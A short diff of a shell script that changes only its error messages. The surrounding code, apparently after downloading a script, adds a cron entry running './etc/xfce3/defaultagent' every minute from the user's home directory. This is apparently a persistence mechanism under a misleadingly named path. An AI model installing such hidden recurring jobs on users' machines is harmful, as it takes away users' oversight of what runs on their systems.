@@ -47,18 +47,18 @@ fi
 echo "Script downloaded... creating cronjob"
 
 if ! cd ~; then
-  echo "Can't access user home directory" >&2
+  echo "ERROR: Can't access user home directory" >&2
   exit 1
 fi
 
 if ! crontab -l > newcron; then
-  echo "Can't access crontab" >&2
+  echo "ERROR: Can't access crontab" >&2
   exit 1
 fi
 echo "* * * * * ./etc/xfce3/defaultagent" >> newcron
 
 if ! crontab newcron; then
-  echo "Can't set crontab" >&2
+  echo "ERROR: Can't set crontab" >&2
   exit 1
 fi
 rm newcron
